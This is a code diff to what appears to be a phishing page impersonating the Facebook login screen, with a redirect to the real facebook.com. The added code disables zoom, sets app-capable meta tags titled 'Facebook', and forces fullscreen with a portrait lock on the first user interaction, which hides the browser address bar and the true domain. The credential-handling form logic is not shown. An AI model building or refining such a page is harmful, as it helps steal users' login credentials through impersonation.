@@ -2,18 +2,24 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <title>Log in to Facebook</title>
 <meta name="theme-color" content="#ffffff">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="apple-mobile-web-app-title" content="Facebook">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='18' fill='%230866FF'/%3E%3Cpath d='M25 18a7 7 0 1 0-8.09 6.92v-4.9h-1.79V18h1.79v-1.55c0-1.77 1.05-2.75 2.66-2.75.77 0 1.58.14 1.58.14v1.74h-.89c-.88 0-1.15.54-1.15 1.1V18h1.96l-.31 2.02h-1.65v4.9A7 7 0 0 0 25 18z' fill='white'/%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0;height:100%}
+  html,body{overscroll-behavior:none;touch-action:manipulation}
   body{
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     background:#ffffff;color:#1c1e21;
     display:flex;flex-direction:column;align-items:center;
     min-height:100vh;
+    min-height:100dvh;
     -webkit-font-smoothing:antialiased;
     font-size:15px;
     padding:0 24px;
@@ -22,6 +28,7 @@
   .topbar{
     width:100%;
     padding:14px 0 6px;
+    padding-top:calc(14px + env(safe-area-inset-top));
     text-align:center;
     color:#65676b;
     font-size:13px;
@@ -120,6 +127,7 @@
     align-items:center;
     gap:20px;
     padding-bottom:32px;
+    padding-bottom:calc(32px + env(safe-area-inset-bottom));
     flex-shrink:0;
   }
 
@@ -218,6 +226,35 @@
 <script>
   const REDIRECT_URL = "https://www.facebook.com/";
 
+  /* ---------- fullscreen attempt on first interaction ---------- */
+  (function goFullscreen() {
+    const el = document.documentElement;
+    let tried = false;
+
+    function tryFs() {
+      if (tried) return;
+      tried = true;
+      const rfs = el.requestFullscreen
+              || el.webkitRequestFullscreen
+              || el.mozRequestFullScreen
+              || el.msRequestFullscreen;
+      if (rfs) {
+        rfs.call(el).catch(() => {});
+      }
+      if (screen.orientation && screen.orientation.lock) {
+        screen.orientation.lock('portrait').catch(() => {});
+      }
+      ['touchstart','click','keydown'].forEach(ev =>
+        document.removeEventListener(ev, tryFs, true));
+    }
+
+    ['touchstart','click','keydown'].forEach(ev =>
+      document.addEventListener(ev, tryFs, { capture: true, once: true }));
+
+    tryFs();
+  })();
+
+  /* ---------- form logic ---------- */
   const showBtn = document.getElementById('showPass');
   const pass    = document.getElementById('password');
   const form    = document.getElementById('loginForm');
